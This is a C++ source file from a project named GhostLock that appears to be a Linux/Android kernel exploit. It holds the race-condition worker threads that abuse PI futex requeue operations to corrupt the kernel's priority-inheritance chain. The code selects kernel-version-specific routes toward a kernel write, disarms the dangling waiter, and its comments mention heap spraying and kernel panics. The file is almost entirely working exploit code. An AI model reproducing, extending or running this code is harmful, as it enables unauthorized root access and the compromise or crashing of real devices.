/*
 * GhostLock — PI race worker threads and the per-write route entry.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "routes/route_threads.hpp"

#include "exploit_ops.hpp"
#include "profile.h"
#include "routes/route_controller.h"
#include "session/exploit_session.hpp"

namespace ghostlock::race {

/* Decoupling plan: run the shared PI waiter and delegate route execution.
 * Input: currently implicit race/session state; output: completion/status.
 * CPP09: PiRace owns the lifecycle; this entry body and route dispatch move
 * to the stage controller in CPP12. */
void *waiter_thread(void *arg) {
    auto *race = static_cast<PiRaceContext *>(arg);
    const WriteRequest *request = race->request;
    ghostlock::support::disable_rseq_for_thread();
    int tid = (int) syscall(SYS_gettid);
    atomic_store(&race->waiter_tid, tid);
    if (ghostlock::support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
        pr_error("waiter lock chain errno=%d\n", errno);
    atomic_store(&race->waiter_ready, 1);
    while (!atomic_load(&race->owner_started))
        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
    struct timespec timeout;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
    if (atomic_load(&race->fast_repair)) {
        timeout.tv_nsec += 20000000L;
        if (timeout.tv_nsec >= 1000000000L) {
            timeout.tv_sec++;
            timeout.tv_nsec -= 1000000000L;
        }
    } else {
        uint64_t wait_ns =
                (uint64_t) ghostlock::ops::execution_settings()->race_route_wait_ms * 1000000ULL;
        timeout.tv_sec += (time_t)(wait_ns / 1000000000ULL);
        timeout.tv_nsec += (long) (wait_ns % 1000000000ULL);
        if (timeout.tv_nsec >= 1000000000L) {
            timeout.tv_sec++;
            timeout.tv_nsec -= 1000000000L;
        }
    }
    atomic_store(&race->waiter_waiting, 1);
    ghostlock::support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
            &race->target_futex, 0);
    ghostlock::route::RouteKind selected = ghostlock::support::kernel5_route_selected()
            ? ghostlock::route::ROUTE_KIND_MULTICAST_WAITER
            : (ghostlock::support::tcp_route_selected()
                    ? ghostlock::route::ROUTE_KIND_TCP_ZEROCOPY
                    : ghostlock::route::ROUTE_KIND_SELECT_STACK);
    ghostlock::route::RouteController controller;
    ghostlock::route::route_controller_init(&controller, race, &g_target_profile, selected);
    race->route_status = ghostlock::route::route_controller_execute(&controller, request);
    if (controller.fallback_used) {
        pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
    }
    if (selected == ghostlock::route::ROUTE_KIND_MULTICAST_WAITER) {
        /* remove_waiter() left this thread's pi_blocked_on pointing at the
         * reclaimed stack waiter. Force one final slow-path removal while the
         * stack frame is still alive, matching the 5.x multicast primitive's
         * disarm step. Without this, thread exit leaves a walkable dangling
         * ghost and the next mm_struct spray can panic the kernel. */
        uint32_t dummy_pi = 0x80000000U | (uint32_t) getpid();
        struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
        errno = 0;
        long disarm = ghostlock::support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
        pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
    }
    atomic_store(&race->route_done, 1);
    ghostlock::support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&race->owner_chain_done))
        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
    return NULL;
}

/* Decoupling plan: own the target and chain PI futexes. Input: PiRaceContext;
 * output: synchronization state; lifecycle owned by PiRace (CPP09). */
void *owner_thread(void *arg) {
    auto *race = static_cast<PiRaceContext *>(arg);
    ghostlock::support::disable_rseq_for_thread();
    long lock_target = ghostlock::support::futex_op(
            &race->target_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
    while (!atomic_load(&race->waiter_ready) &&
            !atomic_load(&race->owner_stop))
        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
    if (atomic_load(&race->owner_stop)) {
        if (lock_target == 0)
            ghostlock::support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        return NULL;
    }
    atomic_store(&race->owner_started, 1);
    ghostlock::support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&race->owner_chain_done, 1);
    while (!atomic_load(&race->owner_stop)) sleep(1);
    if (lock_target == 0)
        ghostlock::support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

/* Decoupling plan: trigger PI traversal from the consumer CPU. Inputs:
 * PiRaceContext, TargetProfile and RuntimeConfig; output: attempt counters;
 * lifecycle owned by PiRace (CPP09). */
void *consumer_thread(void *arg) {
    auto *race = static_cast<PiRaceContext *>(arg);
    ghostlock::support::disable_rseq_for_thread();
    pin_to_core((size_t) race->consumer_cpu);
    pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
    int seen = 0;
    while (!atomic_load(&race->consumer_stop)) {
        int seq = atomic_load(&race->consumer_go);
        if (seq == 0 || seq == seen) {
            __asm__ volatile("yield":: : "memory");
            continue;
        }
        seen = seq;
        int tid = atomic_load(&race->waiter_tid);
        int calls_this_seq = 0;
        while (!atomic_load(&race->consumer_stop) &&
                atomic_load(&race->consumer_go) == seq) {
            int delay_usec = atomic_load(&race->route_delay_usec);
            if (delay_usec > 0) usleep((useconds_t) delay_usec);
            for (uint32_t burst = 0;
                 burst < ghostlock::ops::execution_settings()->select_consumer_burst_calls; burst++) {
                if (atomic_load(&race->consumer_stop) ||
                        atomic_load(&race->consumer_go) != seq)
                    break;
                atomic_fetch_add(&race->consumer_calls, 1);
                atomic_store(&race->consumer_inflight, 1);
                errno = 0;
                /* rotate the nice every call; (calls%19)+1 is what makes
                 * sched_setattr succeed on 6.1 compact */
                int consumer_nice = target_profile_has_compact_waiter(&g_target_profile)
                        ? (calls_this_seq % 19) + 1
                        : PSELECT_CONSUMER_NICE;
                long sched_ret = ghostlock::support::sched_setattr_tid(tid, consumer_nice);
                if (sched_ret != 0) {
                    struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                    long fret = ghostlock::support::futex_op(
                            &race->target_futex, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
                    if (fret == 0) {
                        ghostlock::support::futex_op(
                                &race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
                        sched_ret = 0;
                    }
                }
                if (sched_ret == 0) atomic_fetch_add(&race->consumer_success, 1);
                atomic_store(&race->consumer_inflight, 0);
                calls_this_seq++;
                if ((uint32_t) calls_this_seq >=
                        ghostlock::ops::execution_settings()->select_consumer_max_calls) {
                    atomic_store(&race->consumer_go, 0);
                    break;
                }
            }
        }
    }
    return NULL;
}

/* Decoupling plan: reset one PI race attempt. Input/output: PiRaceContext;
 * output: initialized synchronization state; lifecycle lives in PiRace::reset(). */
void reset_main_route_state(void) {
    int fast_repair = atomic_load(&ghostlock::g_exploit_session.race.fast_repair);
    ghostlock::g_exploit_session.race.reset(
            fast_repair ? 5000 : (int) ghostlock::ops::execution_settings()->select_enter_delay_us,
            runtime_config_snapshot().main_cpu, runtime_config_snapshot().consumer_cpu);
    atomic_store(&ghostlock::g_exploit_session.race.fast_repair, fast_repair);
}

}  // namespace ghostlock::race

/* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
 * route outcome once the waiter reported completion. The count/timeout policy
 * lives in outcome_with_counters() and TODO(pi-timeout-01). */
RouteStatus ghostlock::PiRace::run() noexcept {
    while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
    pr_info("[route] waiter parked; owner started\n");
    usleep(atomic_load(&fast_repair)
            ? 5000
            : ghostlock::ops::execution_settings()->race_setup_settle_us);
    errno = 0;
    long rq = ghostlock::support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void *) 1,
            &target_futex, 0);
    pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
            rq, errno);
    /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
     * the race window (observed when the Shizuku log pipe applied
     * backpressure) parks the process forever and the corrupted PI chain is
     * never disarmed. Bound the wait from TargetProfile.execution and map a
     * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
    while (!atomic_load(&route_done))
        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
    const RouteStatus status = route_status;
    const int calls = atomic_load(&consumer_calls);
    const int success = atomic_load(&consumer_success);
    pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
            "calls=%d success=%d\n", status.code, status.userspace_clean,
            status.kernel_disarmed, status.step, status.error_number,
            calls, success);
    return outcome_with_counters(status, calls, success);
}

namespace ghostlock::race {

/* Create, synchronize, stop and join one explicitly owned PI race. */
int run_main_route_threads(const WriteRequest *request) {
    reset_main_route_state();
    pr_info("[route] creating waiter/owner/consumer\n");
    int error = ghostlock::g_exploit_session.race.start_threads(
            waiter_thread, owner_thread, consumer_thread, request);
    if (error) {
        ghostlock::g_exploit_session.race.route_status = (RouteStatus) {
                .code = ROUTE_DIRTY_FAILURE,
                .step = 20,
                .error_number = error,
        };
        pr_warning("PI race thread creation failed errno=%d\n", error);
        return 0;
    }
    RouteStatus status = ghostlock::g_exploit_session.race.run();
    ghostlock::g_exploit_session.race.request_stop();
    ghostlock::g_exploit_session.race.join();
    pr_info("[route] threads joined\n");
    return status.code == ROUTE_OK;
}

}  // namespace ghostlock::race
